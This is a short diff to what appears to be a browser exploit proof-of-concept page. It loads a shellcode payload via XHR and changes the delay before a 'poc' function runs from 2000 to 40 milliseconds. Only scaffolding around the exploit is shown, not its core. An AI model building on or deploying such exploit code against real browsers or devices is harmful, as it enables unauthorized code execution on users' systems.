@@ -84,7 +84,7 @@ if (window.applicationCache.status=='0'){window.location.replace("cache.html");}
       tmp.set(new Uint8Array(xhr.response), 0);
 
       payloadShellcode = new Uint32Array(tmp);
-      setTimeout(poc, 2000);
+      setTimeout(poc, 40);
     }
   };
   xhr.onerror = function () {
